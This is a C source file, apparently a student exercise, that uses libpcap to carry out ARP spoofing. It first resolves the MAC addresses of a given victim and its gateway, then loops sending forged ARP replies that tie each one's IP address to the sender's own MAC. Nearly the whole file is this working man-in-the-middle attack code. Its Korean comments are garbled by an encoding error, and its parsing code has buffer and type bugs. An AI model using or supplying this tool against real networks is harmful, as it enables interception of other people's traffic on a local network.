#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <pcap.h>

#define HW_ADDR_LEN 6 //�ϵ����
#define PTL_ADDR_LEN 4 //��������
#define EN_ADDR_LEN 6 //�̴���
#define PTL_HW_TYPE_LEN 2 //�������� �ϵ���� Ÿ��
#define PTL_HW__LEN 1 //�������� �ϵ���� ����

typedef struct _ethernet
{
    unsigned char dst_en_add[EN_ADDR_LEN];
    unsigned char src_en_add[EN_ADDR_LEN];
    unsigned char prt_type[PTL_HW_TYPE_LEN];
}ethernet;//14����Ʈ �̴��� ���

typedef struct _arphd
{
    unsigned char hw_type[PTL_HW_TYPE_LEN];
    unsigned char ptl_type[PTL_HW_TYPE_LEN];
    unsigned char hw_len[PTL_HW__LEN];
    unsigned char ptl_len[PTL_HW__LEN];
    unsigned char op[2];
    unsigned char src_hw_add[HW_ADDR_LEN];
    unsigned char src_ptl_add[PTL_ADDR_LEN];
    unsigned char dst_hw_add[HW_ADDR_LEN];
    unsigned char dst_ptl_add[PTL_ADDR_LEN];
}arphd;//28����Ʈ ARP ��� 

typedef struct _arp
{
    struct _ethernet ethernet;
    struct _arphd arphd;
}arp;//�� ����ü�� ���� 

void usage() {
    printf("syntax: pcap-test <interface> <IP> <GW>\n");
    printf("sample: pcap-test wlan0 10.0.1.101 10.0.1.1\n");
}//���� ����Լ�

typedef struct {
    char* dev_;
} Param; //�̸��� ������ ����ü �ʵ�

Param param = {
    .dev_ = NULL
};//����ü �ʵ� �ʱ�ȭ

bool parse(Param* param, int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}//���� �Ҹ����� ���� ��°� �Բ� false ��ȯ
//���� ������ ��Ʈ��ũ �������̽� �̸� ����� true ��ȯ

int main(int argc, char *argv[]){
	Param param = { .dev_ = NULL };
    if (!parse(&param, argc, argv))
        return -1;//�Ľ� �Լ� ȣ�� ���н� ���α׷� ����
	int temp ; //�ӽ������ 
    int sock; //���� ��ũ���� ���� ����
    struct ifreq ifr; // ifreq ����ü ���� ����
    unsigned char *mac = NULL; // mac �ּҸ� ������ char ������ ����
    struct ifaddrs *addrs, *tmp; // ��Ʈ��ũ �������̽� ������ �����ϰ� �ݺ��ϴ� �� ���Ǵ� ����ü ����
    struct sockaddr_in *sa; // IPv4 �ּ� ������ �����ϴ� ����ü
    char *addr;
    int temp2 = 0; //�ӽ����� 
    int temp3[4];//�ӽ����� �迭 
    int temp4=0;
    int ty = 0;// 0==�������� mac�ּ� �������� ���� 1==gateway �������� ���� 2==�����ڸ� ���̴� ���� 3==����Ʈ���̸� ���̰� ���ǹ��� ���� �ݺ���
    uint8_t iptemp[3];
    unsigned char tempip [17]; //������ IP
    unsigned char pmactemp[10];//�������� mac�ּ� ����
    unsigned char gmactemp[10];//����Ʈ������ mac�ּ� ����
    char errbuf[PCAP_ERRBUF_SIZE];//���� �޽��� ���� �迭
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;//���� �޽��� ��°� �Բ� ���α׷� ����
    }

    getifaddrs(&addrs);
    tmp = addrs;

    // ��Ʈ��ũ �������̽� ����� �ݺ��ϸ� IPv4 �ּ� ������ ���
    while (tmp){
        if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET){
            sa = (struct sockaddr_in*)tmp->ifa_addr;
            addr = inet_ntoa(sa->sin_addr);
        }
        tmp = tmp->ifa_next;
    }
    // getifaddrs�� ���� ������ �޸𸮿��� ����
    freeifaddrs(addrs);

    // ����� �Ű������� ��Ʈ��ũ �������̽� �̸��� IP GW�� ����
    if(argc != 4){
        printf("interface name input");
        return 1;
    }

    memset(&ifr,0x00,sizeof(ifr)); // ifr ����ü �ʱ�ȭ
    strcpy(ifr.ifr_name, argv[1]); // ifr ����ü�� ����ڰ� �Է��� �������̽� �̸� ����

    sock = socket(AF_INET, SOCK_STREAM, 0); // ���� ����

    if(sock < 0 ){ // ���� ���� ���� Ȯ��
        printf("socket error");
        return 1;
    }
    if(ioctl(sock,SIOCGIFHWADDR,&ifr)<0){ // ioctl�� ��Ʈ��ũ �������̽��� MAC �ּ� ���
        printf("ioctl error");
        return 1;
    }

    mac = ifr.ifr_hwaddr.sa_data;
    printf("%s\n",addr);
    printf("%02x:%02x:%02x:%02x:%02x:%02x\n",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
    while (true) {
        uint8_t buffer[60];
        struct pcap_pkthdr* header;
        const u_char* packet;
        ethernet eth;
        arphd ah;
        arp ap;
        int packetindex = sizeof(ethernet) + sizeof(arphd);
        //�̴��� ��� 
        if (ty <= 1) {
            for(int i = 0; i < 6; i++) {
                eth.dst_en_add[i] = 0xFF;//��ε� ĳ��Ʈ 
            }
        }
        else if (ty == 2) {
            for (int i = 0; i < 6; i++) {
                eth.dst_en_add[i] = pmactemp[i];//������ ������ mac
            }
        }
        else if (ty == 3) {
            for (int i = 0; i < 6; i++) {
                eth.dst_en_add[i] = gmactemp[i];//������ gateway mac
            }
        }
        for (int i = 0; i < 6; i++) {
            eth.src_en_add[i] = mac[i];//�� mac�ּ� 
        }
        eth.prt_type[0] = 0x08;
        eth.prt_type[1] = 0x06;
        //arp ��� 
        ah.hw_type[0] = 0x00;// �̴����� ����ϱ� ������ 00 01  
        ah.hw_type[1] = 0x01;
        ah.ptl_type[0] = 0x08;// IPv4 �̱� ������ 08 00 
        ah.ptl_type[1] = 0x00;
        ah.hw_len[0] = 0x06;//mac �ּ��� ���̰� 
        ah.ptl_len[0] = 0x04;//IPv4�� ���̰� 
        ah.op[0] = 0x00;
        if (ty <= 1) {//mac���� �˾Ƴ��� ����
            ah.op[1] = 0x01;//��û�̱� ������ 00 01 
        }
        else {
            ah.op[1] = 0x02;//reply�̱� ������ 00 02 
        }
        for (int i = 0; i < 6; i++) {
            ah.src_hw_add[i] = mac[i];//�� mac�ּ� 
        }
        if (ty <= 1) {
            for (int i = 0; i < 17; i++) {//�� IP�ּ�
                if (addr[i] == '.' || addr[i] == NULL) {
                    if (temp2 == 1) {
                        temp = temp3[temp2 - 1];
                        temp2 = 0;
                    }
                    else if (temp2 == 2) {
                        temp = (10 * temp3[temp2 - 2] + temp3[temp2 - 1]);
                        temp2 = 0;
                    }
                    else if (temp2 == 3) {
                        temp = (100 * temp3[temp2 - 3] + 10 * temp3[temp2 - 2] + temp3[temp2 - 1]);
                        temp2 = 0;
                    }
                    temp2 = 0;
                    sprintf(iptemp, "%02x", temp);
                    sscanf(iptemp, "%hhx", &ah.src_ptl_add[temp4]);
                    temp4 += 1;
                    if (addr[i] == NULL) {
                        temp4 = 0;
                        temp2 = 0;
                        break;
                    }
                }
                else {
                    temp3[temp2] = (addr[i] - '0');
                    temp2 += 1;
                }
            }
        }
        else {
            if (ty == 2) {
                strcpy(tempip, argv[3]);
            }
            else if (ty == 3) {
                strcpy(tempip, argv[2]);
            }
            for (int i = 0; i < 17; i++) {//���� IP�ּ�
                if (tempip[i] == '.' || tempip[i] == NULL) {
                    if (temp2 == 1) {
                        temp = temp3[temp2 - 1];
                        temp2 = 0;
                    }
                    else if (temp2 == 2) {
                        temp = (10 * temp3[temp2 - 2] + temp3[temp2 - 1]);
                        temp2 = 0;
                    }
                    else if (temp2 == 3) {
                        temp = (100 * temp3[temp2 - 3] + 10 * temp3[temp2 - 2] + temp3[temp2 - 1]);
                        temp2 = 0;
                    }
                    temp2 = 0;
                    sprintf(iptemp, "%02x", temp);
                    sscanf(iptemp, "%hhx", &ah.src_ptl_add[temp4]);
                    temp4 += 1;
                    if (tempip[i] == NULL) {
                        temp4 = 0;
                        temp2 = 0;
                        break;
                    }
                }
                else {
                    temp3[temp2] = (tempip[i] - '0');
                    temp2 += 1;
                }
            }
        }
        if (ty <= 1) {
            for (int i = 0; i < 6; i++) {
                ah.dst_hw_add[i] = 0x00;//������ mac �ּ� 
            }
        }
        else if (ty == 2) {
            for (int i = 0; i < 6; i++) {
                ah.dst_hw_add[i] = pmactemp[i];//������ mac �ּ� 
            }
        }
        else if (ty == 3) {
            for (int i = 0; i < 6; i++) {
                ah.dst_hw_add[i] = gmactemp[i];//������ mac �ּ� 
            }
        }
        if (ty == 0) {
            strcpy(tempip, argv[2]);
        }
        else if (ty == 1) {
            strcpy(tempip, argv[3]);
        }
        else if (ty == 2) {
            strcpy(tempip, argv[2]);
        }
        else if (ty == 3) {
            strcpy(tempip, argv[3]);
        }
        for (int i = 0; i < 17; i++) {//������ IP�ּ�
            if (tempip[i] == '.' || tempip[i] == NULL) {
                if (temp2 == 1) {
                    temp = temp3[temp2 - 1];
                    temp2 = 0;
                }
                else if (temp2 == 2) {
                    temp = (10 * temp3[temp2 - 2] + temp3[temp2 - 1]);
                    temp2 = 0;
                }
                else if (temp2 == 3) {
                    temp = (100 * temp3[temp2 - 3] + 10 * temp3[temp2 - 2] + temp3[temp2 - 1]);
                    temp2 = 0;
                }
                temp2 = 0;
                sprintf(iptemp, "%02x", temp);
                sscanf(iptemp, "%hhx", &ah.dst_ptl_add[temp4]);
                temp4 += 1;
                if (tempip[i] == NULL) {
                    temp4 = 0;
                    temp2 = 0;
                    break;
                }
            }
            else {
                temp3[temp2] = (tempip[i] - '0');
                temp2 += 1;
            }
        }
        ap.ethernet = eth;
        ap.arphd = ah;
        memcpy(&buffer, &ap, packetindex);
        for (int i = 42; i < 60; i++)
        {
            buffer[i] = 0x00;
        }
        int dump=0;
    	if(pcap_sendpacket(pcap,buffer,60)!=0){
    		printf("send fail\n");
        }
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;//��Ŷ �� ��ٸ��� 
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            return -1;//���� �޽��� ��°� �Բ� ���� 
        }
        if (ty == 0) {
            ethernet* ethp = (ethernet*)packet;//�̴��ݿ� ��Ŷ �� 14����Ʈ��ŭ ���� 
            arphd* ahp = (arphd*)(packet + sizeof(ethernet));//�̴��ݿ� ������ �κ� �����ϰ� ����  
            printf("\n");
            for (int i = 0; i < 6; i++) {
                pmactemp[i] = ahp->src_hw_add[i];
                printf("!!%02x!!\n", pmactemp[i]);
            }
        }
        else if (ty == 1) {
            ethernet* ethg = (ethernet*)packet;//�̴��ݿ� ��Ŷ �� 14����Ʈ��ŭ ���� 
            arphd* ahg = (arphd*)(packet + sizeof(ethernet));//�̴��ݿ� ������ �κ� �����ϰ� ����  
            printf("\n");
            for (int i = 0; i < 6; i++) {
                gmactemp[i] = ahg->src_hw_add[i];
                printf("!!%02x!!\n", gmactemp[i]);
            }
        }
        if (ty == 0) {
            ty = 1;
            continue;
        }
        else if (ty == 1) {
            ty = 2;
            continue;
        }
        else if (ty == 2) {
            ty = 3;
            continue;
        }
        else if(ty == 3){
            ty = 2;
            continue;
        }
        break;
	}
	pcap_close(pcap);
}